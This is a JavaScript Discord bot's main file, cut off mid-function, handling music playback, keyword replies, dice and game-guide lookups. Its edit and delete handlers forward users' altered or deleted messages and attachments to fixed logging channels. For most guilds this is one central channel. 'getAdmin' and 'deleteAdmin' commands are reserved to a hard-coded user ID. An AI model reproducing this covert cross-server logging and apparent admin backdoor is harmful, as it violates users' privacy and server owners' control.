//#region Discord.js套件
const Discord = require('discord.js');
//不變的使用者
const client = new Discord.Client();
//載入env變量
require('dotenv').config();
//播歌
const ytdl = require('ytdl-core');
const ytpl = require('ytpl');
//健康狀態
require('./sideJS/healthCheck').start();
//#endregion

//#region 繼承js
const gasApi = require('./sideJS/gasGet.js');
const messageManager = require('./sideJS/messageManager.js');
const myDBFunction = require('./sideJS/myDataBase.js');
const NineFunction = require('./sideJS/NineFunction.js');
const cornTask = require('./sideJS/cronTask.js');
//#endregion
//#region 讀json
const baseValue = require('./jsonHome/baseValue.json');
const romValue = require('./jsonHome/romValue.json');
//#endregion

//#region 表單資料
//資料狀態控制
let downloading = false;

//機器人訊息庫
let botMessage;

//使用者專屬訊息庫
let userMessage;

//歌單
let nowSongName = new Map();
let dispatcher = new Map();
let songList = new Map();
let songInfo = new Map(); //歌曲詳細資訊
let songLoop = new Map(); //歌曲循環
let catchCount = 0; //音樂主程序例外狀況的連續崩潰次數

//持續執行方法2
let DoUserID2 = new Array();
let nowDoFunction2 = new Map();
let DoingCount2 = new Map();
let DoData2 = new Map();

//掃地回答
let nineFunctionData;
let nowNineFunctionIndex = 0;
let NineUsers = [];

//#endregion

//#region 載入表單資料&啟動BOT
//幸之心
const MyToken = process.env.TOKEN;
client.login(MyToken);

client.on('ready', () => {
    downloading = true; //下載中
    console.log('start');
    myDBFunction.getDataFormBotMessage(function (value) {
        if (value) {
            botMessage = value;
            console.log('1.getDataFormBotMessage');
        }
        myDBFunction.getDataFormUserMessage(function (value) {
            if (value) {
                userMessage = value;
                console.log('2.getDataFormUserMessage');
            }
            NineFunction.GetNineData(function (dataED) {
                if (dataED) {
                    nineFunctionData = dataED;
                    console.log('3.getNineData');
                }

                cornTask.cronCallMysell();
                console.log('cronCallMysell Start');

                // client.user.setAFK(true);
                client.user.setActivity('請使用 ~ help 查詢使用說明書!', { type: 'WATCHING' });
                //setInterval(CheckIfYTStart, 600000);
                console.log(`Logged in as ${client.user.tag}!`);
                downloading = false; //下載結束
            })
        })
    })
});
//#endregion

//#region onMessage
client.on('message', msg => {
    //#region 前置偵錯
    try {

        //#region 07簡介修改
        if (msg.channel) {
            if (msg.channel.id === '765774426515308554') { //時鐘
                OClockFunction(msg);
                return;
            } else
                if (msg.channel.id === '808506248005419028') { //掃地
                    NineOClock();
                    return;
                }
        }
        //#endregion

        //大分類判斷
        if (!msg.guild || !msg.member || downloading) return;
        //中分類判斷
        if (!msg.member.user) return;
        //小分類判斷
        if (msg.member.user.bot) return;
    } catch (err) {
        console.log(err, 'error#001')
    }
    //#endregion

    if ((msg.channel.id === '709293980684386344' || msg.channel.id === '716316365555761183') && msg.content === '掃地') {
        NineOther(msg);
        return;
    }

    //宣告
    let args;
    const cmd = (msg.content.split(' '));

    if (cmd[1] !== undefined) {

        let baseBeforeText = romValue.find(value => value.value == cmd[0]);
        if (baseBeforeText !== undefined) {
            baseBeforeText = baseBeforeText.value;
        } else {
            baseBeforeText = cmd[0];
        }

        if (msg.content.substring(0, cmd[0].length) === baseBeforeText) {
            // ID 1 FROM romValue
            args = msg.content.substring(baseBeforeText.length + cmd[1].length + 2).split(romValue[1].value);
        }

        SelectFunctionFromBeforeText(msg, cmd, args);
    } else {
        if (cmd[0] !== undefined) {
            SelectFunctionFromBeforeText(msg, cmd);
        }
    }
});

//新增主要功能時，需要修改這邊的switchTemp與romValue
function SelectFunctionFromBeforeText(msg, cmd, args = [""]) {

    //續行方法2
    if (nowDoFunction2.get(msg.author.id) && DoUserID2.indexOf(msg.author.id) !== -1) {
        nowDoFunction2.get(msg.author.id)(msg);
        return;
    }

    //#region temp賦予
    //標準
    let temp = 9;
    for (let i = 0; i <= romValue.length - 1; i++) {
        if (cmd[0] == romValue[i].value) {
            temp = romValue[i].id;
            break;
        }
    }

    //權限判斷
    temp = findPowerFromBaseValue(msg, temp);
    //正則判斷
    if (cmd[1] !== undefined)
        temp = DeleteTempIfHaveEx(msg.content, temp);
    else temp = DeleteTempIfHaveEx(cmd[0], temp);
    //#endregion

    switch (temp) {
        case 0: //系統指令
            DoBaseFunction(msg, cmd[1], args);
            break;
        case 2: //修改觸發句功能
            DoEditRomValue(msg, cmd[1], args);
            break;
        case 3: //攻略組查表
            DoRaidersGet(msg, cmd[1], args);
            break;
        case 4: //音樂指令
            DoMusicFunction(msg, cmd[1], args);
            break;
        case 5: //TRpg指令
            DoTRpgFunction(msg, cmd[1], args);
            break;
        case 6:
            TagFunction(msg, 6);
            break;
        case 9: //關鍵字回復
            //只有一個字元就不觸發了
            if (msg.content.length > 1) {
                DoBotMessageSend(msg, cmd[0], cmd[1]);
            }
            break;
    }
}
//#endregion

//#region onMessage事件下方法
//baseFunction
async function DoBaseFunction(msg, cmd, args) {
    switch (cmd) {
        case 'help':
            GetHelpMessage(msg, args)
            break;
        case '老婆':
            msg.reply('你沒有老婆!!');
            break;
        case '安安':
            msg.channel.send('午安');
            break;
        case 'myAvatar':
            const avatar = {
                files: [{
                    attachment: msg.author.displayAvatarURL,
                    name: 'avatar.jpg'
                }]
            };
            if (avatar.files) {
                msg.channel.send(`${msg.author}`, avatar);
            }
            break;
        case 'otherAvatar':
            let attachmented = await client.users.fetch(args[0]);
            const avatarED = {
                files: [{
                    attachment: attachmented.displayAvatarURL('png', true, 4096),
                    name: 'avatar.jpg'
                }]
            };
            if (avatarED.files) {
                msg.channel.send(`${msg.author}`, avatarED);
            }
            break;
        case 'test2':
            msg.channel.send('西西');
            break;
        case 's': //傳貼圖
            sendEmoji(msg, args);
            break;
        case '貓':
            getCatImage(msg);
            break;
        case '食物':
            getFoodImage(msg);
            break;
        case 'dice':
            getDice(msg, cmd, args);
            break;
        case 'd':
            getDice(msg, cmd, args);
            break;
        case 'v':
            //getVote(msg, cmd, args);
            break;
        case 'haveAdmin':
            HaveAdmin(msg);
            break;
        case 'getAdmin':
            if (msg.author.id === '165753385385984000')
                GetGuildAdmin(msg);
            break;
        case 'deleteAdmin':
            if (msg.author.id === '165753385385984000')
                DeleteAdmin(msg, args);
            break;
        case 'sendMessage':
            if (msg.author.id === '165753385385984000') {
                const sendMessageChannelID = await client.channels.fetch(args[0]).then(channel => channel);
                const sendMessageText = msg.content.substring(msg.content.indexOf(args[0]) + args[0].length, msg.content.length);
                sendMessageChannelID.send(sendMessageText);
            }
            break;
        case 'testD':
            msg.channel.messages.forEach(x => x.delete());
            break;
        case 'testE':
            let messageED = await msg.channel.messages.fetch(args[0]);
            console.log('testE');
            messageED.edits.forEach(ms => { console.log(ms.content); });
            break;
        case 'MemberReact':
            AddMemberReact(msg, args);
            break;
    }
}

//攻略組 舊寫法 待優化
function DoRaidersGet(msg, cmd, args) {
    switch (cmd) {
        case '轉生點': //轉生點查詢
            LevelFunction(msg, cmd, args);
            break;
        case '技能':
            SkillFunction(msg, cmd, args);
            break;
        case '情報':
            SkillFunction(msg, cmd, args);
            break;
        case '成就':
            MileageFunction(msg, cmd, args);
            break;
        case '樓層':
            BossFunction(msg, cmd, args);
            break;
    }
}

//音樂指令
function DoMusicFunction(msg, cmd, args) {
    goToMusicHouse(msg, cmd, args);
}

//TRpg指令
function DoTRpgFunction(msg, cmd, args) {
    switch (cmd) {
        case 'dice': //骰子
            getTRpgDice(msg, args);
            break;
        case 'DICE': //骰子
            getTRpgDice(msg, args);
            break;
        case 'd': //骰子
            getTRpgDice(msg, args);
            break;
        case 'D': //骰子
            getTRpgDice(msg, args);
            break;
        case '排序': //排序
            getRandomSortArray(msg, cmd, args);
            break;
    }
}

//關鍵字回復
function DoBotMessageSend(msg, cmd, args) {
    let BTalk;
    if (args === undefined) BTalk = findUserMessageToATalk(msg, cmd);
    else BTalk = findUserMessageToATalk(msg, cmd, args);

    if (Array.isArray(BTalk)) {
        if (BTalk.length == 0) {
            if (args === undefined) BTalk = findBotMessageToATalk(cmd);
            else BTalk = findBotMessageToATalk(cmd, args);
        }
    } else {
        if (BTalk === undefined) {
            if (args === undefined) BTalk = findBotMessageToATalk(cmd);
            else BTalk = findBotMessageToATalk(cmd, args);
        }
    }

    if (BTalk !== undefined) {
        if (BTalk.length != 0) {
            if (BTalk[0] !== undefined) {
                message = valueChange(BTalk[0].BTalk, msg);
            } else {
                message = valueChange(BTalk.BTalk, msg);
            }
            //隨機化處理
            if (message.indexOf("$$") !== -1) {
                message = valueRandom(message);
            }
            msg.channel.send(message);
        }
    };
}

//#endregion

//#region 抓刪
//抓刪 更新事件
client.on('messageUpdate', function (oldMessage, newMessage) {
    if (!oldMessage.guild || !newMessage.guild) return;

    try {
        if (oldMessage.content !== newMessage.content) {
            //愛恩葛朗特
            if (oldMessage.guild.id === '707946293603074108') {
                str = `事件 更新\n使用者 ${oldMessage.member.user.username}\n群組 ${oldMessage.channel.name}\n舊對話 ${oldMessage.content}\n新對話 ${newMessage.content}\n`;
                client.channels.fetch('733348701346725888').then(channel => channel.send(str))
                    .catch(err => { console.log(err + 'messageUpdate 文字錯誤') });
                client.channels.fetch('788647840733855754').then(channel => channel.send(str))
                    .catch(err => { console.log(err + 'messageUpdate 文字錯誤') });
            } else
                //UW
                if (oldMessage.guild.id === '716315638787735624') {
                    str = `事件 更新\n使用者 ${oldMessage.member.user.username}\n群組 ${oldMessage.channel.name}\n舊對話 ${oldMessage.content}\n新對話 ${newMessage.content}\n`;
                    client.channels.fetch('770857844794720286').then(channel => channel.send(str))
                        .catch(err => { console.log(err + 'messageUpdate 文字錯誤') });
                } else {
                    str = `事件 更新\n使用者 ${oldMessage.member.user.username}\n群組 ${oldMessage.guild.name}\n頻道 ${oldMessage.channel.name}\n舊對話 ${oldMessage.content}\n新對話 ${newMessage.content}\n`;
                    client.channels.fetch('869099635376025600').then(channel => channel.send(str))
                        .catch(err => { console.log(err + 'messageUpdate 文字錯誤') });
                }
        }
    } catch (err) {
        console.log(err);
        console.log('messageUpdate 主錯誤')
    }
})

//抓刪 刪除事件
client.on('messageDelete', function (message) {
    if (!message.guild) return;

    try {
        //愛恩葛朗特
        if (message.guild.id === '707946293603074108') {
            str = `事件 刪除\n使用者 ${message.member.user.username}\n群組 ${message.channel.name}\n刪除內容 ${message.content}\n`;
            client.channels.fetch('733348701346725888').then(channel => channel.send(str))
                .catch(err => { console.log(err + 'messageDelete 文字錯誤') });
            message.attachments.forEach((value, key) => {
                client.channels.fetch('733348701346725888').then(channel => channel.send({
                    files: [{
                        attachment: value.proxyURL,
                        name: key + '.jpg'
                    }]
                })).catch(err => { console.log(err + 'messageDelete 抓圖錯誤') })
            });

            client.channels.fetch('788647840733855754').then(channel => channel.send(str))
                .catch(err => { console.log(err + 'messageDelete 文字錯誤') });
            message.attachments.forEach((value, key) => {
                client.channels.fetch('788647840733855754').then(channel => channel.send({
                    files: [{
                        attachment: value.proxyURL,
                        name: key + '.jpg'
                    }]
                })).catch(err => { console.log(err + 'messageDelete 抓圖錯誤') })
            });
        } else

            //UW
            if (message.guild.id === '716315638787735624') {
                str = `事件 刪除\n使用者 ${message.member.user.username}\n群組 ${message.channel.name}\n刪除內容 ${message.content}\n`;
                client.channels.fetch('770857844794720286').then(channel => channel.send(str))
                    .catch(err => { console.log(err + 'messageDelete 文字錯誤') });
                message.attachments.forEach((value, key) => {
                    client.channels.fetch('770857844794720286').then(channel => channel.send({
                        files: [{
                            attachment: value.proxyURL,
                            name: key + '.jpg'
                        }]
                    })).catch(err => { console.log(err + 'messageDelete 抓圖錯誤') })
                });
            } else {
                str = `事件 刪除\n使用者 ${message.member.user.username}\n群組 ${message.guild.name}\n頻道 ${message.channel.name}\n刪除內容 ${message.content}\n`;
                client.channels.fetch('869099635376025600').then(channel => channel.send(str))
                    .catch(err => { console.log(err + 'messageDelete 文字錯誤') });
                message.attachments.forEach((value, key) => {
                    client.channels.fetch('869099635376025600').then(channel => channel.send({
                        files: [{
                            attachment: value.proxyURL,
                            name: key + '.jpg'
                        }]
                    })).catch(err => { console.log(err + 'messageDelete 抓圖錯誤') })
                });
            }
    } catch (err) {
        console.log(err);
        console.log('messageDelete 主錯誤');
    }
})

//#endregion

//#region 更新頻道簡介
client.on('channelUpdate', function (oldChannel, newChannel) {
    try {
        //只做SAO群的簡介紀錄
        if (newChannel.guild) {
            if (newChannel.guild.id == '707946293603074108') {
                let embed = new Discord.MessageEmbed()
                    .setColor('#fbfbc9')
                    .setTimestamp();
                //如果更新頻道訊息是07
                if (oldChannel.id == '719892968579792907') {
                    embed.setTitle(newChannel.name);
                    embed.addField('簡介', newChannel.topic);
                    client.channels.fetch('746179713407385672').then(channel => channel.send(embed));
                } else {
                    embed.setTitle(newChannel.name);
                    embed.addField('簡介', newChannel.topic);
                    client.channels.fetch('746179727747973138').then(channel => channel.send(embed));
                }
            }
        }
    } catch (err) {
        console.log('channelUpdate Error');
    }
})

//#endregion

//#region 續行方法改良2

//開啟續行方法2
function CreateAllDoingFunction2(funED, userID, dataED, countED = 0) {
    nowDoFunction2.set(userID, funED);
    DoingCount2.set(userID, countED);
    DoData2.set(userID, dataED);
    DoUserID2.push(userID);
}

//關閉續行方法2
function CloseAllDoingFunction2(userID) {
    if (DoUserID2.indexOf(userID) != -1) {
        nowDoFunction2.set(userID, undefined);
        DoingCount2.set(userID, 0);
        DoData2.set(userID, undefined);
        DoUserID2 = DoUserID2.splice(DoUserID2.indexOf(userID), 1);
    }
}

//#endregion

//#region 方法們

//#region 攻略組

//轉生點
function LevelFunction(msg, cmd, args) {
    if (args[0] === undefined || args[0] === '' || args[1] === '' || args[0] > 100 || args[0] < 1 || args[1] > 10 || args[1] < 1 || isNaN(args[0]) === true || (isNaN(args[1]) === true && args[1] !== undefined)) {
        msgs = '```轉生點查詢\n語法:攻略組 轉生點 {等級} [範圍]\n\n從選擇等級開始查詢，根據範圍返還查詢數量\n\n等級不可低於1，不可大於100\n範圍不可低於1，不可大於10(預設5)```'
        msg.channel.send(msgs);
    } else {
        //範圍預設5
        if (args[1] === undefined) {
            args[1] = 5;
        }
        gasApi.getLevel(args[0], args[1], function (data) {
            getLevel(args[0], data, function (msgs) {
                msg.channel.send(msgs);
            })
        })
    }
}

//攻略組轉生點，資料處理
function getLevel(level, data, callback) {
    try {
        let j = parseFloat(level);
        let msgs = '```';
        for (i = 0; i <= data.length - 1; i++) {
            if (data[i] !== undefined) {
                msgs = msgs + `等級${paddingLeft((i + j), 4)} | 等級所需經驗${paddingLeft(data[i].lat, 7)} | 累積轉生點${paddingLeft(data[i].lng, 3)} \n`;
            }
        }
        msgs = msgs + '```';
        if (msgs === '``````') {
            msgs = '你能不能正常打字?';
        }
        callback(msgs);
    } catch (err) {
        console.log(err, 'getLevelError');
    }
}

//技能
function SkillFunction(msg, cmd, args) {
    try {
        gasApi.getSkill(args[0], Discord.MessageEmbed, function (msgs, reData) {

            if (reData == null) msg.channel.send(msgs);
            else {
                //頁數上限
                let many = [0];
                if (reData.get('state')[0] != '') {
                    many.push(1);
                }
                if (reData.get('nickname')[1] != '') {
                    many.push(2);
                }

                if (many == 0) msg.channel.send(msgs);
                else {
                    let msgA = msg;
                    msg.channel.send(msgs).then(msg => {
                        msg.react("⏪")
                            .then(msg.react("⏩"))
                        let i = 0; //頁次


                        const filter = (reaction, user) => {
                            return ['⏩', '⏪'].includes(reaction.emoji.name) && user.id === msgA.author.id;
                        };

                        const collector = msg.createReactionCollector(filter, { time: 600000 });

                        collector.on('collect', (reaction, user) => {
                            switch (reaction.emoji.name) {
                                case '⏩':
                                    if (i >= many.length - 1) {
                                        msg.channel.send('後面就沒有了喔~~')
                                            .then(msg => {
                                                setTimeout(() => {
                                                    msg.delete();
                                                }, 5000);
                                            })
                                    } else {
                                        i = i + 1;
                                        EditSkillList(i, many, reData, msg);
                                    }
                                    break;
                                case '⏪':
                                    if (i <= 0) {
                                        msg.channel.send('這邊是開頭喔!')
                                            .then(msg => {
                                                setTimeout(() => {
                                                    msg.delete();
                                                }, 5000);
                                            })
                                    } else {
                                        i = i - 1;
                                        EditSkillList(i, many, reData, msg);
                                    }
                                    break;
                            }
                        })
                    })
                }
            }
        });
    } catch (err) {
        console.log(err, 'SkillFunctionError');
    }
}

function EditSkillList(temp, many, reData, msg) {
    let embed = new Discord.MessageEmbed()
        .setColor('#fbfbc9')
        .setAuthor(reData.get('name'))
        .setTitle('獲得方式')
        .setDescription(reData.get('getData'))
        .setTimestamp()
        .setFooter('有出錯請找 石頭#2873', 'https://i.imgur.com/crrk7I2.png');
    //角色圖片
    if (reData.get('authorImg') !== '') embed.setThumbnail(reData.get('authorImg'));
    //備註&角色頻道
    if (reData.get('backUp') !== '' && reData.get('dcUrl') !== '') {
        embed.addField('備註', reData.get('backUp'), true);
        embed.addField('角色頻道', reData.get('dcUrl'), true);
    } else if (reData.get('dcUrl') !== '') {
        embed.addField('角色頻道', reData.get('dcUrl'));
    } else if (reData.get('backUp') !== '') {
        embed.addField('備註', reData.get('backUp'));
    }

    embed.addField('\u200B', '\u200B', false);
    switch (many[temp]) {
        case 0:
            for (var i = 0; i < reData.get('skill')[0]; i++) {
                embed.addField(reData.get('skill')[i + 1], reData.get('task')[i], true)
            }
            break;
        case 1:
            embed
                .addField('HP', reData.get('state')[0])
                .addField('攻擊', reData.get('state')[1], true)
                .addField('防禦', reData.get('state')[2], true)
                .addField('體力', reData.get('state')[3], true)
                .addField('敏捷', reData.get('state')[4], true)
                .addField('反應速度', reData.get('state')[5], true)
                .addField('技巧', reData.get('state')[6], true)
                .addField('智力', reData.get('state')[7], true)
                .addField('幸運', reData.get('state')[8], true)
                .addField('\u200B', '\u200B', true);
            break;
        case 2:
            embed
                .addField('初始稱號', reData.get('nickname')[1]);
            for (var i = 1; i < reData.get('nickname')[0]; i++) {
                embed.addField(reData.get('nickname')[i + 1], reData.get('nicknameQ')[i + 1], true);
                embed.addField('效果', reData.get('nicknameD')[i + 1], true);
                embed.addField('\u200B', '\u200B', false);
            }
            break;
    }
    msg.edit(embed);
}

//成就
function MileageFunction(msgA, cmd, args) {
    gasApi.getMileage(function (msgData) {
        if (typeof (msgData) == 'string') {
            msgA.channel.send(msgData);
        } else if (typeof (msgData) == 'object') {
            let texture = ['🔟', '🇦', '🇧', '🇨', '🇩', '🇪', '🇫', '🇬', '🇭', '🇮', '🇯']
            let str = '';
            for (i = 1; i < msgData.length; i++) {
                str = str + msgData[i][0].MyIDName + ' 請點選 ' + texture[i] + '\n\n';
            }
            msgA.channel.send('```成就\n\n請根據貼圖選擇要查看的分類~\n\n' + str + '```')
                .then(msg => {
                    for (i = 1; i < msgData.length; i++) {
                        if (msgData[i] != undefined) {
                            if (msgData[i].length != 0) {
                                msg.react(texture[i])
                            }
                        }
                    }
                    const filter = (reaction, user) => {
                        return texture.includes(reaction.emoji.name) && user.id === msgA.author.id;
                    };

                    const collector = msg.createReactionCollector(filter, { time: 600000 });

                    collector.on('collect', (reaction, user) => {
                        const j = texture.indexOf(reaction.emoji.name);
                        const selectData = msgData[j];
                        let str = '```' + selectData[0].MyIDName + '\n\n';
                        for (i = 0; i < selectData.length; i++) {
                            str = `${str}條件名稱 ${selectData[i].Answer}\n獲得點數 ${selectData[i].Point}\n不同角色可否累積 ${selectData[i].Repeat}\n\n`;
                        }
                        str = str + '```';
                        msg.channel.send(str);
                    })
                })
                .catch(err => {
                    console.log('errMileage', err)
                })
        }
    })
}

//樓層訊息
function BossFunction(msg, cmd, args) {
    gasApi.getBoss(args[0], Discord.MessageEmbed, function (msgs) {
        msg.channel.send(msgs);
    });
}
//#endregion

//#region status參考
// 1 = 完全匹配
// 2 = 相似匹配
//#endregion
//根據ATalk找botMessage的對應資料
function findBotMessageToATalk(cmd, status = 1) {
    let BTalk;
    if (status == 1) {
        BTalk = botMessage.filter(item => item.ATalk == cmd);
    } else if (status == 2) {
        BTalk = botMessage.filter(item => cmd.indexOf(item.ATalk) != -1)
    }

    //如果帶回不只一個json，取得觸發字串最大者
    if (BTalk !== undefined)
        if (BTalk.length > 1) {
            let BTalkLength = new Array;
            BTalk.forEach(item => BTalkLength.push((item.ATalk).length));
            BTalkLength = Math.max(...BTalkLength);
            BTalk = BTalk.find(item => (item.ATalk).length == BTalkLength);
        }

    return BTalk;
}

//根據ATalk找userMessage的對應資料
function findUserMessageToATalk(msg, cmd, status = 1) {
    let BTalk;
    if (status == 1) {
        BTalk = userMessage.filter(item => item.ATalk == cmd && item.targetID == msg.author.id);
    } else if (status == 2) {
        BTalk = userMessage.filter(item => cmd.indexOf(item.ATalk) != -1 && item.targetID == msg.author.id)
    }

    //如果帶回不只一個json，取得觸發字串最大者
    if (BTalk !== undefined)
        if (BTalk.length > 1) {
            let BTalkLength = new Array;
            BTalk.forEach(item => BTalkLength.push((item.ATalk).length));
            BTalkLength = Math.max(...BTalkLength);
            BTalk = BTalk.find(item => (item.ATalk).length == BTalkLength);
        }

    return BTalk;
}

//傳送貼圖
function sendEmoji(msg, args) {
    let a = new Array;
    let mStr = '';
    try {
        args.forEach(element => {
            a.push(client.emojis.cache.find(emoji => emoji.name === element.replace(':', '')))
        })
        a.forEach(element => {
            if (element === undefined || element === null) {
                msg.channel.send('Alice cant find this emoji').then(data => {
                    msg.delete();
                    setTimeout(data.delete(), 2000);
                })
            } else if (element.animated) {
                mStr = mStr + `<a:${element.name}:${element.id}>`;
                // msg.channel.send('this emoji is animated').then(data => {
                //     msg.delete();
                //     setTimeout(data.delete(), 2000);
                // })
            } else {
                mStr = mStr + `<:${element.name}:${element.id}>`;
            }
        })
    } catch (err) {
        console.log('sendEmojiError ', err);
    } finally {
        if (mStr !== '') msg.channel.send(mStr).then(data => msg.delete());
    }
}

//貓圖
function getCatImage(msg) {
    gasApi.getCatImage(url => {
        if (url.substring(0, 4) != 'http') {
            msg.channel.send(url);
        } else {
            const avatar = {
                files: [{
                    attachment: url,
                    name: 'cat.jpg'
                }]
            };
            if (avatar.files) {
                msg.channel.send('', avatar);
            }
        }
    });
}

//食物
function getFoodImage(msg) {
    gasApi.getFoodImage(url => {
        if (url.substring(0, 4) != 'http') {
            msg.channel.send(url);
        } else {
            const avatar = {
                files: [{
                    attachment: url,
                    name: 'food.jpg'
                }]
            };
            if (avatar.files) {
                msg.channel.send('', avatar);
            }
        }
    });
}
//#endregion

//#region 播歌類方法
//進語音房播歌
async function goToMusicHouse(msg, cmd, args) {
    try {
        switch (cmd) {
            case 'Alice':
                return musicMaster(msg);
            case '休息':
                return goBackHomeFromMusicHouse(msg.guild.id, msg.channel.id);
            case '先播這個':
                return addMusicToOne(msg, args);
            case '先播這首':
                return addMusicToOne(msg, args);
            case '歌單':
                return playMusicList(msg, args);
        }
        let validate = await ytdl.validateURL(cmd);
        if (!validate) return msg.channel.send('The link is not working.1');
        if (cmd.substring(0, 4) !== 'http') return msg.channel.send('The link is not working.2');
        let ytdlED = require('ytdl-core');
        let info = await ytdlED.getInfo(cmd);
        //let info = await ytdlED(cmd);
        if (info.videoDetails) {
            if (msg.member.voice.channel) {
                if (!client.voice.connections.get(msg.guild.id)) {
                    const nowMusicPlayGuild = msg.guild.id;
                    const nowMusicPlayChanel = msg.channel.id;
                    songList.set(nowMusicPlayGuild, new Array());
                    songInfo.set(nowMusicPlayGuild, new Array());
                    songLoop.set(nowMusicPlayGuild, false);
                    addMusicToSongList(nowMusicPlayGuild, cmd);
                    addMusicInfoToSongInfo(nowMusicPlayGuild, info);
                    playMusic(msg, nowMusicPlayGuild, nowMusicPlayChanel);
                    msg.channel.send('來了~').then(
                        msg.delete().catch(err => console.log(err, 'musicError1'))
                    ).catch(err => console.log('musicError1'));
                } else {
                    addMusicToSongList(msg.guild.id, cmd);
                    addMusicInfoToSongInfo(msg.guild.id, info);
                    msg.channel.send('已幫你加入歌單~!').then(
                        msg.delete()
                    ).catch(err => console.log('musicError2'));
                }
            } else {
                msg.reply('請先進入頻道:3...');
            }
        } else {
            msg.channel.send('The link is not working.3');
        }
    } catch (err) {
        console.log(err + ' goToMusicHouse');
        msg.channel.send(`There's error in this function, so you can ask administer for help.`);
    }
}

//歌曲插播
async function addMusicToOne(msg, args) {
    try {
        let validate = await ytdl.validateURL(args[0]);
        if (!validate) return msg.channel.send('The link is not working.1');
        if (args[0].substring(0, 4) !== 'http') return msg.channel.send('The link is not working.2');
        let ytdlED = require('ytdl-core');
        let info = await ytdlED.getInfo(args[0]);
        console.log(info);
        if (info.videoDetails) {
            if (msg.member.voice.channel) {
                if (!client.voice.connections.get(msg.guild.id)) {
                    const nowMusicPlayGuild = msg.guild.id;
                    const nowMusicPlayChanel = msg.channel.id;
                    songList.set(nowMusicPlayGuild, new Array());
                    songInfo.set(nowMusicPlayGuild, new Array());
                    songLoop.set(nowMusicPlayGuild, false);
                    addMusicToSongList(nowMusicPlayGuild, args[0]);
                    addMusicInfoToSongInfo(nowMusicPlayGuild, info);
                    playMusic(msg, nowMusicPlayGuild, nowMusicPlayChanel);
                    msg.channel.send('來了~').then(
                        msg.delete()
                    ).catch(err => console.log('musicError3'));
                } else {
                    addMusicToSongList(msg.guild.id, args[0], 2);
                    addMusicInfoToSongInfo(msg.guild.id, info, 2);
                    msg.channel.send('好的，下一首播這個喔!').then(
                        msg.delete()
                    ).catch(err => console.log('musicError4'));
                }
            } else {
                msg.reply('請先進入頻道:3...');
            }
        } else {
            msg.channel.send('The link is not working.3');
        }
    } catch (err) {
        console.log('addMusicToOne')
        msg.channel.send(`There's error in this function, so you can ask administer for help.`);
    }
}

//退出語音頻道
function goBackHomeFromMusicHouse(nowMusicPlayGuild, nowMusicPlayChanel) {
    try {
        if (client.voice.connections.get(nowMusicPlayGuild)) {
            try {
                nowSongName.set(nowMusicPlayGuild, undefined);
                songList.set(nowMusicPlayGuild, new Array());
                songInfo.set(nowMusicPlayGuild, new Array());
                client.voice.connections.get(nowMusicPlayGuild).disconnect();
                nowMusicPlayGuild = undefined;
            } catch {
                console.log('MusicEndError');
            }
            client.channels.fetch(nowMusicPlayChanel).then(channel => channel.send('晚安~'));
        } else {
            client.channels.fetch(nowMusicPlayChanel).then(channel => channel.send('可是..我還沒進來:3'));
        }
    } catch (err) {
        client.channels.fetch(nowMusicPlayChanel).then(channel => channel.send('晚安~~'));
    }
}

//添加歌曲進歌單
function addMusicToSongList(nowMusicPlayGuild, src, type = 1) {
    try {
        if (type === 1) {
            songList.get(nowMusicPlayGuild).push(src);
        } else if (type === 2) {
            songList.get(nowMusicPlayGuild).unshift(src)
        }
    } catch (err) {
        console.log('addMusicToSongList');
    }
}

//將歌曲資訊打入陣列
function addMusicInfoToSongInfo(nowMusicPlayGuild, info, type = 1) {
    try {
        if (info.videoDetails) {
            if (type === 1) {
                songInfo.get(nowMusicPlayGuild).push(info.videoDetails);
            } else if (type === 2) {
                if (songInfo.get(nowMusicPlayGuild).length !== 0) {
                    nowSongInfo = songInfo.get(nowMusicPlayGuild).shift();
                    songInfo.get(nowMusicPlayGuild).unshift(info.videoDetails);
                    songInfo.get(nowMusicPlayGuild).unshift(nowSongInfo);
                } else {
                    songInfo.get(nowMusicPlayGuild).unshift(info.videoDetails);
                }
            }
        } else if (type === 3) {
            songInfo.get(nowMusicPlayGuild).push(info);
        }
    } catch (err) {
        console.log('addMusicInfoToSongInfo')
    }
}

//播放歌曲
function playMusic(msg, nowMusicPlayGuild, nowMusicPlayChanel) {
    msg.member.voice.channel.join().then(
        connection => {
            try {
                musicPlay2(connection, nowMusicPlayGuild, nowMusicPlayChanel);
            } catch {
                msg.channel.send('播歌期間發生錯誤!\n可能是這首歌小愛不喜歡聽')
            }
        }
    ).catch(err => {
        console.log('musicError5');
        console.log('播歌期間發生錯誤');
        nowSongName.set(nowMusicPlayGuild, undefined);
        goBackHomeFromMusicHouse(nowMusicPlayGuild, nowMusicPlayChanel);
    });
}

// 與playMusic分割，避免重複進出語音
// msg不穩定
async function musicPlay2(connection, nowMusicPlayGuild, nowMusicPlayChanel) {
    try {
        nowSongName.set(nowMusicPlayGuild, songList.get(nowMusicPlayGuild).shift());
        const streamOptions = {
            seek: 0,
            volume: 0.5,
            Bitrate: 192000,
            Passes: 1
        };
        streamOptions.highWaterMark = 1;
        let stream = await ytdl(nowSongName.get(nowMusicPlayGuild), {
            filter: 'audioonly',
            quality: 'highestaudio',
            highWaterMark: 26214400 //25ms
        });
        //dispatcher = connection.playStream(stream, streamOptions);
        dispatcher.set(nowMusicPlayGuild, connection.play(stream, streamOptions));
        dispatcher.get(nowMusicPlayGuild).on("finish", finish => {
            newMusicEnd(nowMusicPlayGuild);
            if (songList.get(nowMusicPlayGuild).length != 0) {
                musicPlay2(connection, nowMusicPlayGuild, nowMusicPlayChanel);
            } else {
                goBackHomeFromMusicHouse(nowMusicPlayGuild, nowMusicPlayChanel);
            }
        });
    } catch (err) {
        console.log('musicPlay2');
        catchCount = catchCount + 1;
        if (catchCount <= 5) {
            client.channels.fetch(nowMusicPlayChanel).then(channel => channel.send('音樂主方法傳回例外錯誤\n重新填充歌曲...\n嘗試重新播放曲目，歌單顯示有可能異常'));
            songList.get(nowMusicPlayGuild).unshift(nowSongName.get(nowMusicPlayGuild))
            if (songList.get(nowMusicPlayGuild).length != 0) {
                musicPlay2(connection, nowMusicPlayGuild, nowMusicPlayChanel);
            } else {
                goBackHomeFromMusicHouse(nowMusicPlayGuild, nowMusicPlayChanel);
            }
        } else {
            catchCount = 0;
            client.channels.fetch(nowMusicPlayChanel).then(channel => channel.send('連續錯誤實例過多，已中斷播放\n或許是小愛不喜歡聽這首歌，請稍後再試~'));
            goBackHomeFromMusicHouse(nowMusicPlayGuild, nowMusicPlayChanel);
        }
    }
};

//歌曲結束事件
function newMusicEnd(nowMusicPlayGuild) {
    try {
        if (songLoop.get(nowMusicPlayGuild)) {
            songInfo.get(nowMusicPlayGuild).push(songInfo.get(nowMusicPlayGuild).shift());
